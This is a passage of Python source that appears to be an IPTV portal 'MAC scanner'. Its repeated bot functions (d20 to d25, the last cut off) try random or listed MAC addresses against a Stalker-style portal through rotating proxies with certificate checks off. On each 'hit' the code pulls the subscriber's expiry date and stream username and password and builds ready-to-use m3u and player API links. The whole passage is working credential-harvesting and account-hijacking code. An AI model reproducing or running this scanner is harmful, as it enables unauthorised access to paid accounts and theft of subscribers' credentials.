        while True:
            try:
                res = ses.get(url1, proxies=proxies, headers=(hea1(macs)), timeout=15, verify=False)
                data = str(res.text)
                break
            except:
                bag = bag + 1
                time.sleep(1)
                if bag == 12:
                    break

        tokenr = ' \x1b[35m'
        if 'token' in data:
            tokenr = '\x1b[0m'
            token = data.replace('{"js":{"token":"', '')
            token = token.split('"')[0]
            bag = 0
            while 1:
                try:
                    res = ses.get(url2, proxies=proxies, headers=(hea2(macs, token)), timeout=15, verify=False)
                    data = ''
                    data = str(res.text)
                    break
                except:
                    bag = bag + 1
                    time.sleep(1)
                    if bag == 12:
                        break

            id = 'null'
            ip = ''
            try:
                id = data.split('{"js":{"id":')[1]
                id = id.split(',"name')[0]
                ip = data.split('ip":"')[1]
                ip = ip.split('"')[0]
            except:
                pass

            if not id == 'null':
                bag = 0
                while 1:
                    try:
                        res = ses.get(url3, proxies=proxies, headers=(hea2(macs, token)), timeout=15, verify=False)
                        data = ''
                        data = str(res.text)
                        break
                    except:
                        bag = bag + 1
                        time.sleep(1)
                        if bag == 12:
                            break

                if not data.count('phone') == 0:
                    hitr = '\x1b[1;36m'
                    hitc = hitc + 1
                    trh = ''
                    if 'end_date' in data:
                        trh = data.split('end_date":"')[1]
                        trh = trh.split('"')[0]
                    else:
                        try:
                            trh = data.split('phone":"')[1]
                            trh = trh.split('"')[0]
                            if trh.lower()[:2] == 'un':
                                DaysRemain = ' Days'
                            else:
                                DaysRemain = str(tarih_clear(trh)) + ' Days'
                                trh = trh + ' ' + DaysRemain
                        except:
                            pass

                        hitprint(mac, trh)
                        bag = 0
                        while 1:
                            try:
                                res = ses.get(url6, proxies=proxies, headers=(hea2(macs, token)), timeout=10, verify=False)
                                data = ''
                                data = str(res.text)
                                cid = ''
                                cid = str(res.text).split('ch_id":"')[5].split('"')[0]
                                break
                            except:
                                bag = bag + 1
                                time.sleep(1)
                                if bag == 12:
                                    cid = '94067'
                                    break

                        real = panel
                        m3ulink = ''
                        user = ''
                        pas = ''
                        case = '𝙐𝙣𝙠𝙣𝙤𝙬𝙣'
                        bag = 0
                        while 1:
                            try:
                                res = ses.get((url(cid)), proxies=proxies, headers=(hea2(macs, token)), timeout=15, verify=False)
                                data = ''
                                data = str(res.text)
                                link = data.split('ffmpeg ')[1].split('"')[0].replace('\\/', '/')
                                real = '' + link.split('://')[1].split('/')[0] + ''
                                user = str(link.replace('live/', '').split('/')[3])
                                pas = str(link.replace('live/', '').split('/')[4])
                                m3ulink = 'http://' + real.replace('http://', '').replace('/c/', '') + '/get.php?username=' + str(user) + '&password=' + str(pas) + '&type=m3u_plus'
                                case = goruntu(link)
                                break
                            except:
                                bag = bag + 1
                                time.sleep(1)
                                if bag == 12:
                                    break

                        playerapi = ''
                        if not m3ulink == '':
                            playerlink = str('http://' + real.replace('http://', '').replace('/c/', '') + '/player_api.php?username=' + user + '&password=' + pas)
                            playerapi = m3uapi(playerlink, macs, token)
                            if playerapi == '':
                                playerlink = str('http://' + panel.replace('http://', '').replace('/c/', '') + '/player_api.php?username=' + user + '&password=' + pas)
                                playerapi = m3uapi(playerlink, macs, token)
                            SN = hashlib.md5(mac.encode('utf-8')).hexdigest()
                            SNENC = SN.upper()
                            SNCUT = SNENC[:13]
                            DEV = hashlib.sha256(mac.encode('utf-8')).hexdigest()
                            DEVENC = DEV.upper()
                            SG = SNCUT + '+' + mac
                            SING = hashlib.sha256(SG.encode('utf-8')).hexdigest()
                            SINGENC = SING.upper()
                            vpn = ''
                            vpn = ip == '' or vpnip(ip)
                        else:
                            vpn = '𝙉𝙊 𝙄𝙋 𝘼𝘿𝘿𝙍𝙀𝙎𝙎'
                    livelist = ''
                    vodlist = ''
                    serieslist = ''
                    if channels == '1' or channels == '2':
                        listlink = liveurl
                        livel = ' 🔹🕳🔹 '
                        livelist = list(listlink, macs, token, livel)
                    if channels == '2':
                        listlink = vodurl
                        livel = ' 🔹🕳🔹 '
                        vodlist = list(listlink, macs, token, livel)
                        listlink = seriesurl
                        livel = ' 🔹🕳🔹 '
                        serieslist = list(listlink, macs, token, livel)
                    hit(mac, trh, real, m3ulink, case, vpn, livelist, vodlist, serieslist, playerapi, SN, SNENC, SNCUT, DEV, DEVENC, SG, SING, SINGENC)


def d20():
    global bad
    global hitc
    global hitr
    global prox
    global tokenr
    for mac in range(20, to, botsay):
        total = mac
        if dosia == '0':
            mac = randommac()
        else:
            macv = re.search(pattern, totLen[mac], re.IGNORECASE)
            if macv:
                mac = macv.group()
            else:
                continue
        macs = mac.upper().replace(':', '%3A')
        bot = 'Bot_20'
        oran = ''
        oran = round(total / to * 100, 2)
        if proxi == '1':
            for pdata in range(20, prox, botsay):
                prox += 1
                bad += 1
                break

        echok(mac, bot, total, hitc, oran, tokenr, proxies)
        bag = 0
        data = ''
        while True:
            try:
                res = ses.get(url1, proxies=proxies, headers=(hea1(macs)), timeout=15, verify=False)
                data = str(res.text)
                break
            except:
                bag = bag + 1
                time.sleep(1)
                if bag == 12:
                    break

        tokenr = ' \x1b[35m'
        if 'token' in data:
            tokenr = '\x1b[0m'
            token = data.replace('{"js":{"token":"', '')
            token = token.split('"')[0]
            bag = 0
            while 1:
                try:
                    res = ses.get(url2, proxies=proxies, headers=(hea2(macs, token)), timeout=15, verify=False)
                    data = ''
                    data = str(res.text)
                    break
                except:
                    bag = bag + 1
                    time.sleep(1)
                    if bag == 12:
                        break

            id = 'null'
            ip = ''
            try:
                id = data.split('{"js":{"id":')[1]
                id = id.split(',"name')[0]
                ip = data.split('ip":"')[1]
                ip = ip.split('"')[0]
            except:
                pass

            if not id == 'null':
                bag = 0
                while 1:
                    try:
                        res = ses.get(url3, proxies=proxies, headers=(hea2(macs, token)), timeout=15, verify=False)
                        data = ''
                        data = str(res.text)
                        break
                    except:
                        bag = bag + 1
                        time.sleep(1)
                        if bag == 12:
                            break

                if not data.count('phone') == 0:
                    hitr = '\x1b[1;36m'
                    hitc = hitc + 1
                    trh = ''
                    if 'end_date' in data:
                        trh = data.split('end_date":"')[1]
                        trh = trh.split('"')[0]
                    else:
                        try:
                            trh = data.split('phone":"')[1]
                            trh = trh.split('"')[0]
                            if trh.lower()[:2] == 'un':
                                DaysRemain = ' Days'
                            else:
                                DaysRemain = str(tarih_clear(trh)) + ' Days'
                                trh = trh + ' ' + DaysRemain
                        except:
                            pass

                        hitprint(mac, trh)
                        bag = 0
                        while 1:
                            try:
                                res = ses.get(url6, proxies=proxies, headers=(hea2(macs, token)), timeout=10, verify=False)
                                data = ''
                                data = str(res.text)
                                cid = ''
                                cid = str(res.text).split('ch_id":"')[5].split('"')[0]
                                break
                            except:
                                bag = bag + 1
                                time.sleep(1)
                                if bag == 12:
                                    cid = '94067'
                                    break

                        real = panel
                        m3ulink = ''
                        user = ''
                        pas = ''
                        case = '𝙐𝙣𝙠𝙣𝙤𝙬𝙣'
                        bag = 0
                        while 1:
                            try:
                                res = ses.get((url(cid)), proxies=proxies, headers=(hea2(macs, token)), timeout=15, verify=False)
                                data = ''
                                data = str(res.text)
                                link = data.split('ffmpeg ')[1].split('"')[0].replace('\\/', '/')
                                real = '' + link.split('://')[1].split('/')[0] + ''
                                user = str(link.replace('live/', '').split('/')[3])
                                pas = str(link.replace('live/', '').split('/')[4])
                                m3ulink = 'http://' + real.replace('http://', '').replace('/c/', '') + '/get.php?username=' + str(user) + '&password=' + str(pas) + '&type=m3u_plus'
                                case = goruntu(link)
                                break
                            except:
                                bag = bag + 1
                                time.sleep(1)
                                if bag == 12:
                                    break

                        playerapi = ''
                        if not m3ulink == '':
                            playerlink = str('http://' + real.replace('http://', '').replace('/c/', '') + '/player_api.php?username=' + user + '&password=' + pas)
                            playerapi = m3uapi(playerlink, macs, token)
                            if playerapi == '':
                                playerlink = str('http://' + panel.replace('http://', '').replace('/c/', '') + '/player_api.php?username=' + user + '&password=' + pas)
                                playerapi = m3uapi(playerlink, macs, token)
                            SN = hashlib.md5(mac.encode('utf-8')).hexdigest()
                            SNENC = SN.upper()
                            SNCUT = SNENC[:13]
                            DEV = hashlib.sha256(mac.encode('utf-8')).hexdigest()
                            DEVENC = DEV.upper()
                            SG = SNCUT + '+' + mac
                            SING = hashlib.sha256(SG.encode('utf-8')).hexdigest()
                            SINGENC = SING.upper()
                            vpn = ''
                            vpn = ip == '' or vpnip(ip)
                        else:
                            vpn = '𝙉𝙊 𝙄𝙋 𝘼𝘿𝘿𝙍𝙀𝙎𝙎'
                    livelist = ''
                    vodlist = ''
                    serieslist = ''
                    if channels == '1' or channels == '2':
                        listlink = liveurl
                        livel = ' 🔹🕳🔹 '
                        livelist = list(listlink, macs, token, livel)
                    if channels == '2':
                        listlink = vodurl
                        livel = ' 🔹🕳🔹 '
                        vodlist = list(listlink, macs, token, livel)
                        listlink = seriesurl
                        livel = ' 🔹🕳🔹 '
                        serieslist = list(listlink, macs, token, livel)
                    hit(mac, trh, real, m3ulink, case, vpn, livelist, vodlist, serieslist, playerapi, SN, SNENC, SNCUT, DEV, DEVENC, SG, SING, SINGENC)


def d21():
    global bad
    global hitc
    global hitr
    global prox
    global tokenr
    for mac in range(21, to, botsay):
        total = mac
        if dosia == '0':
            mac = randommac()
        else:
            macv = re.search(pattern, totLen[mac], re.IGNORECASE)
            if macv:
                mac = macv.group()
            else:
                continue
        macs = mac.upper().replace(':', '%3A')
        bot = 'Bot_21'
        oran = ''
        oran = round(total / to * 100, 2)
        if proxi == '1':
            for pdata in range(21, prox, botsay):
                prox += 1
                bad += 1
                break

        echok(mac, bot, total, hitc, oran, tokenr, proxies)
        bag = 0
        data = ''
        while True:
            try:
                res = ses.get(url1, proxies=proxies, headers=(hea1(macs)), timeout=15, verify=False)
                data = str(res.text)
                break
            except:
                bag = bag + 1
                time.sleep(1)
                if bag == 12:
                    break

        tokenr = ' \x1b[35m'
        if 'token' in data:
            tokenr = '\x1b[0m'
            token = data.replace('{"js":{"token":"', '')
            token = token.split('"')[0]
            bag = 0
            while 1:
                try:
                    res = ses.get(url2, proxies=proxies, headers=(hea2(macs, token)), timeout=15, verify=False)
                    data = ''
                    data = str(res.text)
                    break
                except:
                    bag = bag + 1
                    time.sleep(1)
                    if bag == 12:
                        break

            id = 'null'
            ip = ''
            try:
                id = data.split('{"js":{"id":')[1]
                id = id.split(',"name')[0]
                ip = data.split('ip":"')[1]
                ip = ip.split('"')[0]
            except:
                pass

            if not id == 'null':
                bag = 0
                while 1:
                    try:
                        res = ses.get(url3, proxies=proxies, headers=(hea2(macs, token)), timeout=15, verify=False)
                        data = ''
                        data = str(res.text)
                        break
                    except:
                        bag = bag + 1
                        time.sleep(1)
                        if bag == 12:
                            break

                if not data.count('phone') == 0:
                    hitr = '\x1b[1;36m'
                    hitc = hitc + 1
                    trh = ''
                    if 'end_date' in data:
                        trh = data.split('end_date":"')[1]
                        trh = trh.split('"')[0]
                    else:
                        try:
                            trh = data.split('phone":"')[1]
                            trh = trh.split('"')[0]
                            if trh.lower()[:2] == 'un':
                                DaysRemain = ' Days'
                            else:
                                DaysRemain = str(tarih_clear(trh)) + ' Days'
                                trh = trh + ' ' + DaysRemain
                        except:
                            pass

                        hitprint(mac, trh)
                        bag = 0
                        while 1:
                            try:
                                res = ses.get(url6, proxies=proxies, headers=(hea2(macs, token)), timeout=10, verify=False)
                                data = ''
                                data = str(res.text)
                                cid = ''
                                cid = str(res.text).split('ch_id":"')[5].split('"')[0]
                                break
                            except:
                                bag = bag + 1
                                time.sleep(1)
                                if bag == 12:
                                    cid = '94067'
                                    break

                        real = panel
                        m3ulink = ''
                        user = ''
                        pas = ''
                        case = '𝙐𝙣𝙠𝙣𝙤𝙬𝙣'
                        bag = 0
                        while 1:
                            try:
                                res = ses.get((url(cid)), proxies=proxies, headers=(hea2(macs, token)), timeout=15, verify=False)
                                data = ''
                                data = str(res.text)
                                link = data.split('ffmpeg ')[1].split('"')[0].replace('\\/', '/')
                                real = '' + link.split('://')[1].split('/')[0] + ''
                                user = str(link.replace('live/', '').split('/')[3])
                                pas = str(link.replace('live/', '').split('/')[4])
                                m3ulink = 'http://' + real.replace('http://', '').replace('/c/', '') + '/get.php?username=' + str(user) + '&password=' + str(pas) + '&type=m3u_plus'
                                case = goruntu(link)
                                break
                            except:
                                bag = bag + 1
                                time.sleep(1)
                                if bag == 12:
                                    break

                        playerapi = ''
                        if not m3ulink == '':
                            playerlink = str('http://' + real.replace('http://', '').replace('/c/', '') + '/player_api.php?username=' + user + '&password=' + pas)
                            playerapi = m3uapi(playerlink, macs, token)
                            if playerapi == '':
                                playerlink = str('http://' + panel.replace('http://', '').replace('/c/', '') + '/player_api.php?username=' + user + '&password=' + pas)
                                playerapi = m3uapi(playerlink, macs, token)
                            SN = hashlib.md5(mac.encode('utf-8')).hexdigest()
                            SNENC = SN.upper()
                            SNCUT = SNENC[:13]
                            DEV = hashlib.sha256(mac.encode('utf-8')).hexdigest()
                            DEVENC = DEV.upper()
                            SG = SNCUT + '+' + mac
                            SING = hashlib.sha256(SG.encode('utf-8')).hexdigest()
                            SINGENC = SING.upper()
                            vpn = ''
                            vpn = ip == '' or vpnip(ip)
                        else:
                            vpn = '𝙉𝙊 𝙄𝙋 𝘼𝘿𝘿𝙍𝙀𝙎𝙎'
                    livelist = ''
                    vodlist = ''
                    serieslist = ''
                    if channels == '1' or channels == '2':
                        listlink = liveurl
                        livel = ' 🔹🕳🔹 '
                        livelist = list(listlink, macs, token, livel)
                    if channels == '2':
                        listlink = vodurl
                        livel = ' 🔹🕳🔹 '
                        vodlist = list(listlink, macs, token, livel)
                        listlink = seriesurl
                        livel = ' 🔹🕳🔹 '
                        serieslist = list(listlink, macs, token, livel)
                    hit(mac, trh, real, m3ulink, case, vpn, livelist, vodlist, serieslist, playerapi, SN, SNENC, SNCUT, DEV, DEVENC, SG, SING, SINGENC)


def d22():
    global bad
    global hitc
    global hitr
    global prox
    global tokenr
    for mac in range(22, to, botsay):
        total = mac
        if dosia == '0':
            mac = randommac()
        else:
            macv = re.search(pattern, totLen[mac], re.IGNORECASE)
            if macv:
                mac = macv.group()
            else:
                continue
        macs = mac.upper().replace(':', '%3A')
        bot = 'Bot_22'
        oran = ''
        oran = round(total / to * 100, 2)
        if proxi == '1':
            for pdata in range(22, prox, botsay):
                prox += 1
                bad += 1
                break

        echok(mac, bot, total, hitc, oran, tokenr, proxies)
        bag = 0
        data = ''
        while True:
            try:
                res = ses.get(url1, proxies=proxies, headers=(hea1(macs)), timeout=15, verify=False)
                data = str(res.text)
                break
            except:
                bag = bag + 1
                time.sleep(1)
                if bag == 12:
                    break

        tokenr = ' \x1b[35m'
        if 'token' in data:
            tokenr = '\x1b[0m'
            token = data.replace('{"js":{"token":"', '')
            token = token.split('"')[0]
            bag = 0
            while 1:
                try:
                    res = ses.get(url2, proxies=proxies, headers=(hea2(macs, token)), timeout=15, verify=False)
                    data = ''
                    data = str(res.text)
                    break
                except:
                    bag = bag + 1
                    time.sleep(1)
                    if bag == 12:
                        break

            id = 'null'
            ip = ''
            try:
                id = data.split('{"js":{"id":')[1]
                id = id.split(',"name')[0]
                ip = data.split('ip":"')[1]
                ip = ip.split('"')[0]
            except:
                pass

            if not id == 'null':
                bag = 0
                while 1:
                    try:
                        res = ses.get(url3, proxies=proxies, headers=(hea2(macs, token)), timeout=15, verify=False)
                        data = ''
                        data = str(res.text)
                        break
                    except:
                        bag = bag + 1
                        time.sleep(1)
                        if bag == 12:
                            break

                if not data.count('phone') == 0:
                    hitr = '\x1b[1;36m'
                    hitc = hitc + 1
                    trh = ''
                    if 'end_date' in data:
                        trh = data.split('end_date":"')[1]
                        trh = trh.split('"')[0]
                    else:
                        try:
                            trh = data.split('phone":"')[1]
                            trh = trh.split('"')[0]
                            if trh.lower()[:2] == 'un':
                                DaysRemain = ' Days'
                            else:
                                DaysRemain = str(tarih_clear(trh)) + ' Days'
                                trh = trh + ' ' + DaysRemain
                        except:
                            pass

                        hitprint(mac, trh)
                        bag = 0
                        while 1:
                            try:
                                res = ses.get(url6, proxies=proxies, headers=(hea2(macs, token)), timeout=10, verify=False)
                                data = ''
                                data = str(res.text)
                                cid = ''
                                cid = str(res.text).split('ch_id":"')[5].split('"')[0]
                                break
                            except:
                                bag = bag + 1
                                time.sleep(1)
                                if bag == 12:
                                    cid = '94067'
                                    break

                        real = panel
                        m3ulink = ''
                        user = ''
                        pas = ''
                        case = '𝙐𝙣𝙠𝙣𝙤𝙬𝙣'
                        bag = 0
                        while 1:
                            try:
                                res = ses.get((url(cid)), proxies=proxies, headers=(hea2(macs, token)), timeout=15, verify=False)
                                data = ''
                                data = str(res.text)
                                link = data.split('ffmpeg ')[1].split('"')[0].replace('\\/', '/')
                                real = '' + link.split('://')[1].split('/')[0] + ''
                                user = str(link.replace('live/', '').split('/')[3])
                                pas = str(link.replace('live/', '').split('/')[4])
                                m3ulink = 'http://' + real.replace('http://', '').replace('/c/', '') + '/get.php?username=' + str(user) + '&password=' + str(pas) + '&type=m3u_plus'
                                case = goruntu(link)
                                break
                            except:
                                bag = bag + 1
                                time.sleep(1)
                                if bag == 12:
                                    break

                        playerapi = ''
                        if not m3ulink == '':
                            playerlink = str('http://' + real.replace('http://', '').replace('/c/', '') + '/player_api.php?username=' + user + '&password=' + pas)
                            playerapi = m3uapi(playerlink, macs, token)
                            if playerapi == '':
                                playerlink = str('http://' + panel.replace('http://', '').replace('/c/', '') + '/player_api.php?username=' + user + '&password=' + pas)
                                playerapi = m3uapi(playerlink, macs, token)
                            SN = hashlib.md5(mac.encode('utf-8')).hexdigest()
                            SNENC = SN.upper()
                            SNCUT = SNENC[:13]
                            DEV = hashlib.sha256(mac.encode('utf-8')).hexdigest()
                            DEVENC = DEV.upper()
                            SG = SNCUT + '+' + mac
                            SING = hashlib.sha256(SG.encode('utf-8')).hexdigest()
                            SINGENC = SING.upper()
                            vpn = ''
                            vpn = ip == '' or vpnip(ip)
                        else:
                            vpn = '𝙉𝙊 𝙄𝙋 𝘼𝘿𝘿𝙍𝙀𝙎𝙎'
                    livelist = ''
                    vodlist = ''
                    serieslist = ''
                    if channels == '1' or channels == '2':
                        listlink = liveurl
                        livel = ' 🔹🕳🔹 '
                        livelist = list(listlink, macs, token, livel)
                    if channels == '2':
                        listlink = vodurl
                        livel = ' 🔹🕳🔹 '
                        vodlist = list(listlink, macs, token, livel)
                        listlink = seriesurl
                        livel = ' 🔹🕳🔹 '
                        serieslist = list(listlink, macs, token, livel)
                    hit(mac, trh, real, m3ulink, case, vpn, livelist, vodlist, serieslist, playerapi, SN, SNENC, SNCUT, DEV, DEVENC, SG, SING, SINGENC)


def d23():
    global bad
    global hitc
    global hitr
    global prox
    global tokenr
    for mac in range(23, to, botsay):
        total = mac
        if dosia == '0':
            mac = randommac()
        else:
            macv = re.search(pattern, totLen[mac], re.IGNORECASE)
            if macv:
                mac = macv.group()
            else:
                continue
        macs = mac.upper().replace(':', '%3A')
        bot = 'Bot_23'
        oran = ''
        oran = round(total / to * 100, 2)
        if proxi == '1':
            for pdata in range(23, prox, botsay):
                prox += 1
                bad += 1
                break

        echok(mac, bot, total, hitc, oran, tokenr, proxies)
        bag = 0
        data = ''
        while True:
            try:
                res = ses.get(url1, proxies=proxies, headers=(hea1(macs)), timeout=15, verify=False)
                data = str(res.text)
                break
            except:
                bag = bag + 1
                time.sleep(1)
                if bag == 12:
                    break

        tokenr = ' \x1b[35m'
        if 'token' in data:
            tokenr = '\x1b[0m'
            token = data.replace('{"js":{"token":"', '')
            token = token.split('"')[0]
            bag = 0
            while 1:
                try:
                    res = ses.get(url2, proxies=proxies, headers=(hea2(macs, token)), timeout=15, verify=False)
                    data = ''
                    data = str(res.text)
                    break
                except:
                    bag = bag + 1
                    time.sleep(1)
                    if bag == 12:
                        break

            id = 'null'
            ip = ''
            try:
                id = data.split('{"js":{"id":')[1]
                id = id.split(',"name')[0]
                ip = data.split('ip":"')[1]
                ip = ip.split('"')[0]
            except:
                pass

            if not id == 'null':
                bag = 0
                while 1:
                    try:
                        res = ses.get(url3, proxies=proxies, headers=(hea2(macs, token)), timeout=15, verify=False)
                        data = ''
                        data = str(res.text)
                        break
                    except:
                        bag = bag + 1
                        time.sleep(1)
                        if bag == 12:
                            break

                if not data.count('phone') == 0:
                    hitr = '\x1b[1;36m'
                    hitc = hitc + 1
                    trh = ''
                    if 'end_date' in data:
                        trh = data.split('end_date":"')[1]
                        trh = trh.split('"')[0]
                    else:
                        try:
                            trh = data.split('phone":"')[1]
                            trh = trh.split('"')[0]
                            if trh.lower()[:2] == 'un':
                                DaysRemain = ' Days'
                            else:
                                DaysRemain = str(tarih_clear(trh)) + ' Days'
                                trh = trh + ' ' + DaysRemain
                        except:
                            pass

                        hitprint(mac, trh)
                        bag = 0
                        while 1:
                            try:
                                res = ses.get(url6, proxies=proxies, headers=(hea2(macs, token)), timeout=10, verify=False)
                                data = ''
                                data = str(res.text)
                                cid = ''
                                cid = str(res.text).split('ch_id":"')[5].split('"')[0]
                                break
                            except:
                                bag = bag + 1
                                time.sleep(1)
                                if bag == 12:
                                    cid = '94067'
                                    break

                        real = panel
                        m3ulink = ''
                        user = ''
                        pas = ''
                        case = '𝙐𝙣𝙠𝙣𝙤𝙬𝙣'
                        bag = 0
                        while 1:
                            try:
                                res = ses.get((url(cid)), proxies=proxies, headers=(hea2(macs, token)), timeout=15, verify=False)
                                data = ''
                                data = str(res.text)
                                link = data.split('ffmpeg ')[1].split('"')[0].replace('\\/', '/')
                                real = '' + link.split('://')[1].split('/')[0] + ''
                                user = str(link.replace('live/', '').split('/')[3])
                                pas = str(link.replace('live/', '').split('/')[4])
                                m3ulink = 'http://' + real.replace('http://', '').replace('/c/', '') + '/get.php?username=' + str(user) + '&password=' + str(pas) + '&type=m3u_plus'
                                case = goruntu(link)
                                break
                            except:
                                bag = bag + 1
                                time.sleep(1)
                                if bag == 12:
                                    break

                        playerapi = ''
                        if not m3ulink == '':
                            playerlink = str('http://' + real.replace('http://', '').replace('/c/', '') + '/player_api.php?username=' + user + '&password=' + pas)
                            playerapi = m3uapi(playerlink, macs, token)
                            if playerapi == '':
                                playerlink = str('http://' + panel.replace('http://', '').replace('/c/', '') + '/player_api.php?username=' + user + '&password=' + pas)
                                playerapi = m3uapi(playerlink, macs, token)
                            SN = hashlib.md5(mac.encode('utf-8')).hexdigest()
                            SNENC = SN.upper()
                            SNCUT = SNENC[:13]
                            DEV = hashlib.sha256(mac.encode('utf-8')).hexdigest()
                            DEVENC = DEV.upper()
                            SG = SNCUT + '+' + mac
                            SING = hashlib.sha256(SG.encode('utf-8')).hexdigest()
                            SINGENC = SING.upper()
                            vpn = ''
                            vpn = ip == '' or vpnip(ip)
                        else:
                            vpn = '𝙉𝙊 𝙄𝙋 𝘼𝘿𝘿𝙍𝙀𝙎𝙎'
                    livelist = ''
                    vodlist = ''
                    serieslist = ''
                    if channels == '1' or channels == '2':
                        listlink = liveurl
                        livel = ' 🔹🕳🔹 '
                        livelist = list(listlink, macs, token, livel)
                    if channels == '2':
                        listlink = vodurl
                        livel = ' 🔹🕳🔹 '
                        vodlist = list(listlink, macs, token, livel)
                        listlink = seriesurl
                        livel = ' 🔹🕳🔹 '
                        serieslist = list(listlink, macs, token, livel)
                    hit(mac, trh, real, m3ulink, case, vpn, livelist, vodlist, serieslist, playerapi, SN, SNENC, SNCUT, DEV, DEVENC, SG, SING, SINGENC)


def d24():
    global bad
    global hitc
    global hitr
    global prox
    global tokenr
    for mac in range(24, to, botsay):
        total = mac
        if dosia == '0':
            mac = randommac()
        else:
            macv = re.search(pattern, totLen[mac], re.IGNORECASE)
            if macv:
                mac = macv.group()
            else:
                continue
        macs = mac.upper().replace(':', '%3A')
        bot = 'Bot_24'
        oran = ''
        oran = round(total / to * 100, 2)
        if proxi == '1':
            for pdata in range(24, prox, botsay):
                prox += 1
                bad += 1
                break

        echok(mac, bot, total, hitc, oran, tokenr, proxies)
        bag = 0
        data = ''
        while True:
            try:
                res = ses.get(url1, proxies=proxies, headers=(hea1(macs)), timeout=15, verify=False)
                data = str(res.text)
                break
            except:
                bag = bag + 1
                time.sleep(1)
                if bag == 12:
                    break

        tokenr = ' \x1b[35m'
        if 'token' in data:
            tokenr = '\x1b[0m'
            token = data.replace('{"js":{"token":"', '')
            token = token.split('"')[0]
            bag = 0
            while 1:
                try:
                    res = ses.get(url2, proxies=proxies, headers=(hea2(macs, token)), timeout=15, verify=False)
                    data = ''
                    data = str(res.text)
                    break
                except:
                    bag = bag + 1
                    time.sleep(1)
                    if bag == 12:
                        break

            id = 'null'
            ip = ''
            try:
                id = data.split('{"js":{"id":')[1]
                id = id.split(',"name')[0]
                ip = data.split('ip":"')[1]
                ip = ip.split('"')[0]
            except:
                pass

            if not id == 'null':
                bag = 0
                while 1:
                    try:
                        res = ses.get(url3, proxies=proxies, headers=(hea2(macs, token)), timeout=15, verify=False)
                        data = ''
                        data = str(res.text)
                        break
                    except:
                        bag = bag + 1
                        time.sleep(1)
                        if bag == 12:
                            break

                if not data.count('phone') == 0:
                    hitr = '\x1b[1;36m'
                    hitc = hitc + 1
                    trh = ''
                    if 'end_date' in data:
                        trh = data.split('end_date":"')[1]
                        trh = trh.split('"')[0]
                    else:
                        try:
                            trh = data.split('phone":"')[1]
                            trh = trh.split('"')[0]
                            if trh.lower()[:2] == 'un':
                                DaysRemain = ' Days'
                            else:
                                DaysRemain = str(tarih_clear(trh)) + ' Days'
                                trh = trh + ' ' + DaysRemain
                        except:
                            pass

                        hitprint(mac, trh)
                        bag = 0
                        while 1:
                            try:
                                res = ses.get(url6, proxies=proxies, headers=(hea2(macs, token)), timeout=10, verify=False)
                                data = ''
                                data = str(res.text)
                                cid = ''
                                cid = str(res.text).split('ch_id":"')[5].split('"')[0]
                                break
                            except:
                                bag = bag + 1
                                time.sleep(1)
                                if bag == 12:
                                    cid = '94067'
                                    break

                        real = panel
                        m3ulink = ''
                        user = ''
                        pas = ''
                        case = '𝙐𝙣𝙠𝙣𝙤𝙬𝙣'
                        bag = 0
                        while 1:
                            try:
                                res = ses.get((url(cid)), proxies=proxies, headers=(hea2(macs, token)), timeout=15, verify=False)
                                data = ''
                                data = str(res.text)
                                link = data.split('ffmpeg ')[1].split('"')[0].replace('\\/', '/')
                                real = '' + link.split('://')[1].split('/')[0] + ''
                                user = str(link.replace('live/', '').split('/')[3])
                                pas = str(link.replace('live/', '').split('/')[4])
                                m3ulink = 'http://' + real.replace('http://', '').replace('/c/', '') + '/get.php?username=' + str(user) + '&password=' + str(pas) + '&type=m3u_plus'
                                case = goruntu(link)
                                break
                            except:
                                bag = bag + 1
                                time.sleep(1)
                                if bag == 12:
                                    break

                        playerapi = ''
                        if not m3ulink == '':
                            playerlink = str('http://' + real.replace('http://', '').replace('/c/', '') + '/player_api.php?username=' + user + '&password=' + pas)
                            playerapi = m3uapi(playerlink, macs, token)
                            if playerapi == '':
                                playerlink = str('http://' + panel.replace('http://', '').replace('/c/', '') + '/player_api.php?username=' + user + '&password=' + pas)
                                playerapi = m3uapi(playerlink, macs, token)
                            SN = hashlib.md5(mac.encode('utf-8')).hexdigest()
                            SNENC = SN.upper()
                            SNCUT = SNENC[:13]
                            DEV = hashlib.sha256(mac.encode('utf-8')).hexdigest()
                            DEVENC = DEV.upper()
                            SG = SNCUT + '+' + mac
                            SING = hashlib.sha256(SG.encode('utf-8')).hexdigest()
                            SINGENC = SING.upper()
                            vpn = ''
                            vpn = ip == '' or vpnip(ip)
                        else:
                            vpn = '𝙉𝙊 𝙄𝙋 𝘼𝘿𝘿𝙍𝙀𝙎𝙎'
                    livelist = ''
                    vodlist = ''
                    serieslist = ''
                    if channels == '1' or channels == '2':
                        listlink = liveurl
                        livel = ' 🔹🕳🔹 '
                        livelist = list(listlink, macs, token, livel)
                    if channels == '2':
                        listlink = vodurl
                        livel = ' 🔹🕳🔹 '
                        vodlist = list(listlink, macs, token, livel)
                        listlink = seriesurl
                        livel = ' 🔹🕳🔹 '
                        serieslist = list(listlink, macs, token, livel)
                    hit(mac, trh, real, m3ulink, case, vpn, livelist, vodlist, serieslist, playerapi, SN, SNENC, SNCUT, DEV, DEVENC, SG, SING, SINGENC)


def d25():
    global bad
    global hitc
    global hitr
    global prox
    global tokenr
    for mac in range(25, to, botsay):
        total = mac
        if dosia == '0':
            mac = randommac()
        else:
            macv = re.search(pattern, totLen[mac], re.IGNORECASE)
            if macv:
                mac = macv.group()
            else:
                continue
        macs = mac.upper().replace(':', '%3A')
        bot = 'Bot_25'
        oran = ''
        oran = round(total / to * 100, 2)
        if proxi == '1':
            for pdata in range(25, prox, botsay):
                prox += 1
                bad += 1
                break

        echok(mac, bot, total, hitc, oran, tokenr, proxies)
        bag = 0
        data = ''
        while True:
            try:
                res = ses.get(url1, proxies=proxies, headers=(hea1(macs)), timeout=15, verify=False)
                data = str(res.text)
                break
            except:
                bag = bag + 1
                time.sleep(1)
                if bag == 12:
                    break

        tokenr = ' \x1b[35m'
        if 'token' in data:
            tokenr = '\x1b[0m'
            token = data.replace('{"js":{"token":"', '')
            token = token.split('"')[0]
            bag = 0
            while 1:
                try:
                    res = ses.get(url2, proxies=proxies, headers=(hea2(macs, token)), timeout=15, verify=False)
                    data = ''
                    data = str(res.text)
                    break
                except:
                    bag = bag + 1
                    time.sleep(1)
                    if bag == 12:
                        break

            id = 'null'
            ip = ''
            try:
                id = data.split('{"js":{"id":')[1]
                id = id.split(',"name')[0]
                ip = data.split('ip":"')[1]
                ip = ip.split('"')[0]
            except:
                pass

            if not id == 'null':
                bag = 0
                while 1:
                    try:
                        res = ses.get(url3, proxies=proxies, headers=(hea2(macs, token)), timeout=15, verify=False)
                        data = ''
                        data = str(res.text)
                        break
                    except:
                        bag = bag + 1
                        time.sleep(1)
